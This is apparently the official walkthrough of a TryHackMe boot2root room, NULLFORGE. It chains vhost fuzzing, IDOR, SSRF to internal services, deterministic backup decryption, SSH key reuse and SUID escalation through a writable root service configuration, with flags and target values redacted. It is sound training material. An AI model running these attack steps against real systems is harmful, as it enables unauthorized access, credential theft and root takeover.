# NULLFORGE — Official Public Walkthrough
### Discovery-First Edition

> **Room:** NULLFORGE  
> **Platform:** TryHackMe
> **URL:** https://tryhackme.com/room/nullforge  
> **Difficulty:** Hard  
> **Type:** Challenge / Boot2Root  
> **Target solve time:** ~120 minutes  
> **Flags:** 10

--- 

## ⚠️ Spoiler Notice

This is the official solution walkthrough for **NULLFORGE**.

The walkthrough is intentionally written as a **discovery-first guide**.

It does **not** hand the player the important filenames, object identifiers, hidden hostnames, internal paths, or other answers at the start of each section. Instead, each stage shows:

1. what to inspect,
2. what signal to look for,
3. how to extract the next piece of information,
4. how to validate the discovery,
5. and why that discovery leads to the next stage.

Flag values, the target IP, and secret-derived values remain redacted as:

```text
****
```

The purpose is to document the intended methodology without turning the public walkthrough into an answer sheet.

---

# 1. Challenge Philosophy

NULLFORGE is a chained Linux attack path.

The machine is designed so that every major discovery creates the clue required for the next layer:

```text
External attack surface
        |
        v
Web application
        |
        v
Hidden application surface
        |
        v
Object-level authorization flaw
        |
        v
Internal service disclosure
        |
        v
Server-side request capability
        |
        v
Internal service mapping
        |
        v
Backup infrastructure
        |
        v
Deterministic archive recovery
        |
        v
Credential recovery
        |
        v
Local account
        |
        v
Privileged scheduled maintenance
        |
        v
Trusted writable configuration
        |
        v
Elevated helper
        |
        v
root
```

The intended experience is therefore:

```text
observe → hypothesize → test → discover → validate → pivot
```

Rather than:

```text
guess → exploit → collect flag
```

That distinction is important when approaching the room.

---

# 2. Attacker Preparation

The intended path can be completed from a normal Linux attack workstation.

Useful tools:

```text
nmap
curl
ffuf
openssl
tar
ssh
```

Kali Linux is suitable.

Throughout this walkthrough:

```text
MACHINE_IP
```

means the IP address assigned to the target by TryHackMe.

Keep all target-specific values you discover in notes. In particular, record:

```text
- exposed ports
- discovered hostnames
- object identifiers
- internal services
- artifact identifiers
- encryption parameters
- recovered credentials
- scheduled jobs
```

A useful habit is to maintain a small evidence log:

```text
DISCOVERY:
EVIDENCE:
WHY IT MATTERS:
NEXT TEST:
```

This makes a multi-stage room much easier to follow.

---

# Task 1 — THE FIRST SIGNAL

## Stage Goal

Establish the externally reachable attack surface and identify the first piece of application-controlled information that points deeper into the system.

---

## 1.1 Map the Attack Surface

Start broad:

```bash
nmap -Pn -sC -sV -p- MACHINE_IP
```

Do not immediately assume that every application service must be directly reachable.

### What to record

Identify:

```text
TCP ports
service names
service versions
HTTP headers
SSH information
```

The intended external surface contains:

```text
22/tcp
80/tcp
```

The deeper application services are deliberately restricted to the target itself.

### Reasoning checkpoint

At this point ask:

> If important services are not exposed externally, where could they be?

That question becomes useful later.

---

## 1.2 Inspect the Web Application

Start with the default HTTP response:

```bash
curl -i http://MACHINE_IP/
```

Read both the headers and body.

Do not begin with a large directory brute-force.

First identify what the application itself reveals.

Look for:

```text
links
documentation
status information
API references
static resources
client-side references
operational endpoints
```

If the page contains references to additional resources, request those resources individually.

For example:

```bash
curl -s http://MACHINE_IP/<DISCOVERED_PATH>
```

### What you are trying to discover

The public application exposes operational information and a static application artifact.

The important point is not the filename itself.

The important point is:

> the application has exposed a machine-readable artifact that contains build/application context and the first flag.

Retrieve the resource you discovered and inspect the complete response.

### Flag 01

```text
THM{NULLFORGE::01::****}
```

### Why this matters

The first stage teaches a core CTF habit:

> Read what the application voluntarily exposes before attempting complicated exploitation.

---

# Task 2 — THE RECORD THAT SHOULDN'T EXIST

## Stage Goal

Use information gathered from the public application to identify another web surface, then determine whether its object-level access controls actually work.

---

## 2.1 Look for Another Web Surface

The public application's operational information suggests that the deployment environment is larger than the public site.

A useful next hypothesis is:

> There may be a second virtual host that is not linked from the default page.

Prepare a small hostname wordlist:

```bash
printf "www\nadmin\nportal\nconsole\nops\ndev\nstatus\ninternal\n" \
  > /tmp/vhosts.txt
```

Run a Host-header scan:

```bash
ffuf \
  -u http://MACHINE_IP/ \
  -H "Host: FUZZ.nullforge.internal" \
  -w /tmp/vhosts.txt \
  -fs 1609
```

### Interpreting the result

Do not focus only on the status code.

Compare:

```text
response size
title
headers
body structure
redirect behavior
```

The meaningful candidate should behave differently from the default site.

Once you identify it, add that hostname to `/etc/hosts`:

```bash
echo "MACHINE_IP <DISCOVERED_HOSTNAME>" \
  | sudo tee -a /etc/hosts
```

Then request the discovered host:

```bash
curl -i http://<DISCOVERED_HOSTNAME>/
```

You should now reach a deployment-oriented application rather than the public portal.

---

## 2.2 Identify the First Object

Inspect the deployment application's response.

Look for identifiers such as:

```text
deployment IDs
release IDs
job IDs
environment IDs
record IDs
```

Do not assume an identifier shown in a browser or JSON response is protected.

Copy the visible identifier:

```text
<VISIBLE_OBJECT_ID>
```

Request it directly:

```bash
curl -s \
  http://<DISCOVERED_HOSTNAME>/api/v1/deployments/<VISIBLE_OBJECT_ID>
```

Read the JSON carefully.

You are looking for:

```text
related identifiers
references to other deployments
environment metadata
internal service information
unexpected fields
```

---

## 2.3 Test Object-Level Authorization

The visible record references another deployment object.

Instead of treating that reference as harmless metadata, test whether the API actually enforces authorization when the related identifier is requested.

Use:

```bash
curl -s \
  http://<DISCOVERED_HOSTNAME>/api/v1/deployments/<RELATED_OBJECT_ID>
```

### What should happen

The API returns another deployment record even though the current context does not establish authorization to view it.

This is the key weakness:

```text
identifier discovered
        ↓
identifier requested
        ↓
server returns object
        ↓
authorization boundary fails
```

This is a broken object-level authorization / IDOR-style condition.

The second record also reveals information about an internal service that is not directly exposed to your workstation.

### Flag 02

```text
THM{NULLFORGE::02::****}
```

### Flag 03

```text
THM{NULLFORGE::03::****}
```

### Reasoning checkpoint

You have now learned:

```text
Public site
    ↓
Hidden web application
    ↓
Object reference
    ↓
Unauthorized object
    ↓
Internal service information
```

That internal service is the bridge to the next task.

---

# Task 3 — THE SERVICE BEHIND THE WALL

## Stage Goal

Use the public application's request functionality to reach a service that your workstation cannot access directly.

---

## 3.1 Validate the Internal Service

From the previous task you should have discovered:

```text
127.0.0.1:<INTERNAL_PORT>
```

Try accessing that address directly from your attacker machine only to confirm the boundary:

```bash
curl -i http://127.0.0.1:<INTERNAL_PORT>/health
```

This should not give you the target service.

That is expected.

The address is loopback-relative to the target machine.

### New hypothesis

The public application already contains a feature that accepts a remote resource.

Find that feature from:

```text
homepage
documentation
HTML
application responses
client-side references
```

You are looking for a parameter or endpoint that effectively says:

```text
"fetch this URL for me"
```

---

## 3.2 Prove Server-Side Request Forgery

Once you identify the remote-fetch functionality, point it at the internal health endpoint.

Conceptually:

```bash
curl -i \
  "http://MACHINE_IP/<FETCH_ENDPOINT>?<URL_PARAMETER>=http://127.0.0.1:<INTERNAL_PORT>/health"
```

If the response contains the internal service's response, you have confirmed:

```text
SSRF
```

The request path is now:

```text
Attacker
   |
   v
Public HTTP service
   |
   v
Target localhost
   |
   v
Internal service
```

This is the critical pivot.

---

## 3.3 Enumerate the Internal Service

Use the same SSRF primitive against the internal service's diagnostic functionality.

Start with a health/diagnostic-style endpoint discovered from the service behavior or documentation.

Then inspect the response for:

```text
service names
ports
URLs
backend identifiers
environment information
routing information
```

One internal API response exposes the fourth flag.

### Flag 04

```text
THM{NULLFORGE::04::****}
```

Next, locate the service registry or equivalent internal inventory endpoint.

The response should identify additional services bound to localhost.

Record them as:

```text
SERVICE_A = 127.0.0.1:<PORT>
SERVICE_B = 127.0.0.1:<PORT>
```

Do not assume these ports are externally reachable.

They are useful precisely because SSRF lets you reach them through the target.

---

## 3.4 Pivot Into the Next Internal Service

Take the newly discovered internal application and interrogate its project/workflow information.

Use the SSRF wrapper again:

```bash
curl -s \
  "http://MACHINE_IP/<FETCH_ENDPOINT>?<URL_PARAMETER>=http://127.0.0.1:<FORGE_PORT>/<DISCOVERED_PROJECT_PATH>"
```

Look for:

```text
backup jobs
artifact references
repository names
scheduled workflows
storage backends
```

Next retrieve the artifact metadata referenced by that workflow.

The returned metadata contains the fifth flag and identifies the backup subsystem.

### Flag 05

```text
THM{NULLFORGE::05::****}
```

### Learning point

SSRF is not merely:

> "make one request to localhost."

It is an **internal network access primitive**.

Once you have it, perform structured enumeration:

```text
health
diagnostics
registry
project metadata
artifact metadata
repositories
backend services
```

---

# Task 4 — THE ARCHIVE THAT REMEMBERS

## Stage Goal

Use the internal service map to locate the backup system, recover an encrypted artifact, understand how its passphrase is constructed, and extract the credential material needed for SSH access.

---

## 4.1 Locate the Backup Backend

From the internal registry, you should have a second localhost service.

Test its health or latest-backup functionality through the same SSRF mechanism.

Conceptually:

```bash
curl -s \
  "http://MACHINE_IP/<FETCH_ENDPOINT>?<URL_PARAMETER>=http://127.0.0.1:<BACKUP_PORT>/<LATEST_BACKUP_PATH>"
```

Inspect the complete response.

Record:

```text
artifact identifier
encryption algorithm
backup job name
metadata
```

One value in the response is the sixth flag.

### Flag 06

```text
THM{NULLFORGE::06::****}
```

---

## 4.2 Retrieve the Artifact

Do not guess the archive name.

Use the identifier returned by the backup service.

Then request the corresponding download resource through SSRF and save it locally:

```bash
curl -s \
  "http://MACHINE_IP/<FETCH_ENDPOINT>?<URL_PARAMETER>=http://127.0.0.1:<BACKUP_PORT>/<DISCOVERED_DOWNLOAD_PATH>" \
  -o /tmp/backup.enc
```

Confirm what you received:

```bash
file /tmp/backup.enc
ls -lh /tmp/backup.enc
```

You now have an encrypted backup.

### Important

Do not immediately attempt password cracking.

The challenge provides enough information to reconstruct the encryption inputs.

---

## 4.3 Find the Backup Policy

Return to the internal repository/application discovered earlier.

The repository exposes a configuration artifact describing how backups are encrypted.

The important task here is **not** to memorize its filename.

Instead, identify the configuration entry that contains fields corresponding to:

```text
cipher
KDF
passphrase rule
```

Once you locate the policy, inspect it.

The relevant rule is:

```text
cipher: AES-256-CBC
KDF: PBKDF2
passphrase_rule: latest_commit + job_start_hhmm
```

This changes the problem completely.

You do not have a random password.

You have a deterministic construction rule.

---

## 4.4 Collect the Two Inputs

The policy tells you exactly what inputs are needed:

```text
latest commit
job start time
```

Retrieve those values from the application's backup/repository metadata.

Record them as:

```text
LATEST_COMMIT = <DISCOVERED_VALUE>
JOB_START     = <DISCOVERED_HHMM>
```

The intended passphrase is:

```text
<DISCOVERED_VALUE><DISCOVERED_HHMM>
```

The actual value is intentionally omitted from this public walkthrough.

### Reasoning checkpoint

The correct thought process is:

```text
Encrypted archive
       |
       v
Need password
       |
       v
Backup policy
       |
       v
Passphrase construction rule
       |
       v
Two discoverable inputs
       |
       v
Deterministic passphrase
```

No brute-force phase is intended.

---

## 4.5 Decrypt the Backup

Use the parameters disclosed by the policy:

```bash
openssl enc \
  -d \
  -aes-256-cbc \
  -pbkdf2 \
  -iter 200000 \
  -in /tmp/backup.enc \
  -out /tmp/backup.tar.gz \
  -pass pass:'<DERIVED_PASSPHRASE>'
```

Verify the archive:

```bash
file /tmp/backup.tar.gz
tar -tzf /tmp/backup.tar.gz
```

Do not assume the contents from the walkthrough.

Let the archive tell you what it contains.

---

## 4.6 Discover the Credential Material

Extract into a temporary directory:

```bash
mkdir -p /tmp/nullforge-recovery
tar -xzf /tmp/backup.tar.gz -C /tmp/nullforge-recovery
```

Now search the extracted tree rather than using a hard-coded path:

```bash
find /tmp/nullforge-recovery \
  -type f \
  \( -path '*/.ssh/*' -o -iname '*key*' \) \
  -print
```

Inspect candidate files:

```bash
file <DISCOVERED_FILE>
```

A recovered private SSH key should be recognizable from its format.

Secure it:

```bash
chmod 600 <DISCOVERED_PRIVATE_KEY>
```

The archive also contains a flag-bearing artifact.

Locate it instead of assuming its path:

```bash
find /tmp/nullforge-recovery -type f -iname '*flag*' -print
```

Read the discovered flag file:

```bash
cat <DISCOVERED_FLAG_FILE>
```

### Flag 07

```text
THM{NULLFORGE::07::****}
```

---

## 4.7 Use the Recovered Credential

The recovered key belongs to the local account that the backup workflow protects.

Use the discovered private key:

```bash
ssh \
  -i <DISCOVERED_PRIVATE_KEY> \
  <DISCOVERED_USERNAME>@MACHINE_IP
```

Confirm the current identity:

```bash
whoami
```

Then inspect the account:

```bash
id
```

You should now be operating as the intended low-privileged foothold account.

Search for the user flag instead of assuming its location:

```bash
find "$HOME" -maxdepth 3 -type f -iname '*flag*' -print 2>/dev/null
```

Read the discovered flag:

```bash
cat <DISCOVERED_USER_FLAG>
```

### Flag 08

```text
THM{NULLFORGE::08::****}
```

### Learning point

A backup is a historical copy of a system.

Historical copies often contain:

```text
private keys
tokens
configuration
credentials
automation data
old deployment information
```

The security boundary around "backup" can therefore be weaker than the security boundary around the live application.

---

# Task 5 — THE LAST SCHEDULE

## Stage Goal

Switch to local Linux enumeration, identify a privileged scheduled process, trace its configuration, determine which part of that configuration is writable, and follow the trust relationship to root.

---

## 5.1 Start With Identity and Groups

Now that you have a shell, begin with:

```bash
id
```

Record every group.

One group is especially relevant to the maintenance functionality.

Do not stop after noticing the group name.

The next question is:

> What privileged process uses this group?

---

## 5.2 Enumerate Scheduled Execution

Look for systemd timers:

```bash
systemctl list-timers --all
```

Filter only after you have seen the available jobs:

```bash
systemctl list-timers --all | grep -i maint
```

or:

```bash
systemctl list-timers --all | grep -i null
```

The relevant timer should point to a maintenance service.

Copy the unit name from the timer output:

```text
<DISCOVERED_TIMER_UNIT>
```

Then inspect the service associated with it:

```bash
systemctl cat <DISCOVERED_SERVICE_UNIT>
```

---

## 5.3 Follow the Service Configuration

Do not assume what the service does.

Read its unit definition carefully.

Look for directives such as:

```text
User=
EnvironmentFile=
ExecStart=
WorkingDirectory=
ExecStartPre=
ExecStartPost=
```

The critical combination is:

```text
User=root
```

together with:

```text
EnvironmentFile=<DISCOVERED_ENV_FILE>
```

and a maintenance executable.

That gives you the next hypothesis:

> A root process is consuming configuration stored somewhere else. Who can modify that configuration?

---

## 5.4 Inspect the Environment File

Read the exact environment file referenced by the service:

```bash
cat <DISCOVERED_ENV_FILE>
```

Look for variables that influence execution.

One of them defines a hook/script path:

```text
ROTATION_HOOK=<DISCOVERED_HOOK_PATH>
```

Check permissions on the configuration file:

```bash
ls -l <DISCOVERED_ENV_FILE>
```

The intended weakness is that the file is writable by the maintenance group that the current user belongs to.

This creates the trust boundary:

```text
ops
  |
  v
maintenance group
  |
  v
writable configuration
  |
  v
root service
```

That is the core local privilege-escalation condition.

---

## 5.5 Trace the Hook

Rather than relying on a hard-coded script name, extract the hook path from the environment file:

```bash
HOOK=$(awk -F= '$1=="ROTATION_HOOK"{print substr($0,index($0,"=")+1)}' <DISCOVERED_ENV_FILE>)
echo "$HOOK"
```

Inspect it:

```bash
sed -n '1,160p' "$HOOK"
```

The hook reveals two important behaviors:

```text
1. a stage-09 flag becomes readable by the current account
2. a privileged helper is assigned SUID permissions
```

This is the clue that the final escalation is not a conventional `sudo` exploit.

It is a chain:

```text
writable config
      ↓
root service
      ↓
trusted hook
      ↓
SUID permission
      ↓
privileged helper
```

---

## 5.6 Recover Flag 09

Once the maintenance process has executed, search for newly accessible flag material:

```bash
find "$HOME" /tmp -maxdepth 4 \
  -type f \
  -iname '*flag*' \
  -readable \
  -print 2>/dev/null
```

Inspect the candidate associated with the maintenance stage:

```bash
cat <DISCOVERED_FLAG_FILE>
```

### Flag 09

```text
THM{NULLFORGE::09::****}
```

---

## 5.7 Find the Elevated Helper

Now enumerate SUID binaries in the relevant local installation area:

```bash
find /usr/local -xdev \
  -type f \
  -perm -4000 \
  -ls 2>/dev/null
```

Alternatively, inspect the paths mentioned by the hook:

```bash
grep -nE 'chmod|install|4755|suid' "$HOOK"
```

Use the evidence from the hook to identify the helper that has just been promoted.

Then inspect it:

```bash
ls -l <DISCOVERED_SUID_HELPER>
```

The expected permission pattern includes:

```text
-rwsr-xr-x
```

The `s` in the owner-execute position is the important part.

---

## 5.8 Cross the Final Privilege Boundary

Execute the discovered helper:

```bash
<DISCOVERED_SUID_HELPER>
```

Validate:

```bash
whoami
id
```

A successful escalation should show:

```text
root
```

and:

```text
uid=0(root)
```

---

## 5.9 Find the Final Flag

Do not rely on a hard-coded filename.

Search the root-owned home directory for the final flag material:

```bash
find /root \
  -maxdepth 3 \
  -type f \
  -iname '*flag*' \
  -print 2>/dev/null
```

Read the discovered final flag:

```bash
cat <DISCOVERED_ROOT_FLAG>
```

### Flag 10

```text
THM{NULLFORGE::10::****}
```

NULLFORGE is now complete.

---

# 6. Full Discovery Chain

The intended path can be summarized without exposing the room's answers:

```text
[01] Enumerate external services
          |
          v
[02] Read the public application
          |
          v
[03] Follow application-referenced resources
          |
          v
[04] Discover a second virtual host
          |
          v
[05] Inspect its deployment API
          |
          v
[06] Extract a related object identifier
          |
          v
[07] Test object-level authorization
          |
          v
[08] Recover an internal localhost service
          |
          v
[09] Locate the public server's remote-fetch feature
          |
          v
[10] Confirm SSRF
          |
          v
[11] Enumerate the internal service registry
          |
          +----------------------+
          |                      |
          v                      v
[12] Internal app A          Internal app B
          |                      |
          v                      v
[13] Backup workflow       Backup records
          |                      |
          +----------+-----------+
                     |
                     v
[14] Retrieve encrypted artifact
                     |
                     v
[15] Locate encryption policy
                     |
                     v
[16] Recover derivation inputs
                     |
                     v
[17] Reconstruct passphrase
                     |
                     v
[18] Decrypt archive
                     |
                     v
[19] Discover private key
                     |
                     v
[20] SSH foothold
                     |
                     v
[21] Enumerate local groups
                     |
                     v
[22] Enumerate systemd timers
                     |
                     v
[23] Trace privileged service
                     |
                     v
[24] Trace referenced configuration
                     |
                     v
[25] Identify writable trust boundary
                     |
                     v
[26] Follow privileged hook
                     |
                     v
[27] Discover SUID helper
                     |
                     v
[28] root
```

---

# 7. Flag Progression

| Flag | Discovery milestone | Primary skill |
|---|---|---|
| 01 | Public application artifact | Web reconnaissance |
| 02 | First deployment object | API enumeration |
| 03 | Related unauthorized object | Broken object authorization |
| 04 | Internal diagnostics | SSRF / internal API discovery |
| 05 | Internal artifact metadata | Service enumeration |
| 06 | Backup metadata | Backup discovery |
| 07 | Decrypted archive | Cryptographic reasoning |
| 08 | SSH foothold | Credential recovery |
| 09 | Maintenance stage | Local privilege escalation |
| 10 | Root stage | Privilege escalation |

---

# 8. Why the Attack Chain Works

NULLFORGE is built around a sequence of trust failures.

### Trust Boundary 1 — Public Information

The public application exposes information useful to an attacker.

```text
public web response
        ↓
application structure
```

### Trust Boundary 2 — Hidden Web Surface

A separate application can be reached through virtual-host routing.

```text
Host header
     ↓
different application
```

### Trust Boundary 3 — Object Authorization

An object identifier is treated as sufficient to retrieve an object.

```text
object ID
   ↓
missing authorization check
   ↓
other record
```

### Trust Boundary 4 — Server-Side Requests

A remote-fetch feature allows the public server to reach localhost.

```text
attacker
   ↓
web server
   ↓
localhost service
```

### Trust Boundary 5 — Internal Service Discovery

Internal services expose enough metadata to map the next layers.

```text
registry
   ↓
applications
   ↓
backup infrastructure
```

### Trust Boundary 6 — Backup Design

The backup passphrase is deterministic and its inputs are discoverable.

```text
metadata
   ↓
key derivation rule
   ↓
archive password
```

### Trust Boundary 7 — Historical Credentials

The backup contains a private credential that can authenticate to the target.

```text
backup
   ↓
private key
   ↓
user shell
```

### Trust Boundary 8 — Privileged Configuration

A root maintenance service consumes configuration writable by a low-privileged group.

```text
low privilege
      ↓
writable config
      ↓
root service
```

### Trust Boundary 9 — Privileged Execution

The maintenance workflow changes a helper's permissions, creating a root execution path.

```text
root service
    ↓
hook
    ↓
SUID helper
    ↓
root
```

The room therefore teaches chaining rather than relying on one isolated vulnerability.

---

# 9. Troubleshooting by Evidence

## The virtual-host scan returns too many results

First establish the normal/default response:

```bash
curl -i http://MACHINE_IP/
```

Then compare:

```text
status code
content length
title
headers
body
```

Use the stable default response as the baseline for your ffuf filter.

For this room, the original enumeration used:

```text
-fs 1609
```

If your environment produces a different baseline, measure it rather than blindly copying the number.

---

## The discovered hostname does not resolve

Add the exact hostname you discovered:

```bash
echo "MACHINE_IP <DISCOVERED_HOSTNAME>" \
  | sudo tee -a /etc/hosts
```

Test:

```bash
curl -i http://<DISCOVERED_HOSTNAME>/
```

---

## The internal service cannot be reached directly

That is expected.

Remember:

```text
127.0.0.1
```

refers to the machine making the request.

Use the vulnerable server-side request feature rather than your workstation's loopback interface.

---

## The SSRF request fails

Validate in layers:

```text
1. Can the public site be reached?
2. Is the fetch feature present?
3. Does a simple URL fetch work?
4. Does localhost respond?
5. Does the internal service's health endpoint respond?
6. Does the diagnostic endpoint respond?
```

Do not jump directly to a complex API path before validating the primitive itself.

---

## The archive does not decrypt

Return to the encryption policy.

Verify:

```text
cipher
KDF
iteration count
latest commit value
job start time
concatenation order
```

The intended construction is:

```text
<latest_commit><job_start_hhmm>
```

Do not add separators unless the discovered policy explicitly requires them.

---

## The private key is rejected

Check:

```bash
chmod 600 <DISCOVERED_PRIVATE_KEY>
```

Then verify that the recovered file is actually a private key:

```bash
file <DISCOVERED_PRIVATE_KEY>
```

You can also inspect only its first line:

```bash
head -n 1 <DISCOVERED_PRIVATE_KEY>
```

---

## The maintenance stage does not appear to work

Start with the timer:

```bash
systemctl list-timers --all
```

Then inspect the service:

```bash
systemctl cat <DISCOVERED_SERVICE_UNIT>
```

Then inspect:

```text
User=
EnvironmentFile=
ExecStart=
```

Finally inspect the referenced configuration and hook.

Work from the evidence chain instead of jumping directly to the helper.

---

# 10. Professional Enumeration Mindset

When approaching NULLFORGE, use this loop repeatedly:

```text
OBSERVE
   ↓
What changed?
   ↓
IDENTIFY
   ↓
What component controls that?
   ↓
TEST
   ↓
Can I reproduce it?
   ↓
DOCUMENT
   ↓
What new information did I gain?
   ↓
PIVOT
```

For every new discovery ask:

```text
What does this component know?

What does it trust?

What can I change?

What does it reference?

Who executes it?

What is listening behind it?
```

Those questions are more valuable than any individual command.

---

# 11. Intended Learning Outcomes

By completing NULLFORGE, the player practices:

```text
✓ External service enumeration
✓ Web reconnaissance
✓ Virtual-host discovery
✓ API enumeration
✓ Broken object-level authorization
✓ SSRF identification and exploitation
✓ Internal service discovery
✓ Artifact and backup enumeration
✓ Configuration analysis
✓ Deterministic secret derivation
✓ OpenSSL archive decryption
✓ SSH private-key recovery
✓ Linux group enumeration
✓ systemd timer/service analysis
✓ Writable privileged configuration discovery
✓ Trusted hook analysis
✓ SUID privilege escalation
```

---

# 12. Completion Checklist

A complete solution should account for all ten milestones:

```text
[ ] 01 — Public application discovery
[ ] 02 — Deployment object discovery
[ ] 03 — Unauthorized related object
[ ] 04 — Internal diagnostic service
[ ] 05 — Internal artifact metadata
[ ] 06 — Backup service
[ ] 07 — Decrypted archive
[ ] 08 — SSH foothold
[ ] 09 — Maintenance privilege stage
[ ] 10 — Root
```

---

# 13. Final Takeaway

NULLFORGE is intentionally designed so that the next layer is normally visible inside the current layer.

The most important habit is therefore:

> **Do not ask only "what can I exploit?" Ask "what did I just discover, and what does it point to?"**

The public application points toward the hidden application.

The hidden application points toward an internal service.

The internal service points toward the backup system.

The backup system points toward a credential.

The credential points toward the local account.

The local account points toward the maintenance system.

The maintenance system points toward the privileged helper.

The privileged helper points toward root.

That is the intended NULLFORGE path.

**NULLFORGE complete.**
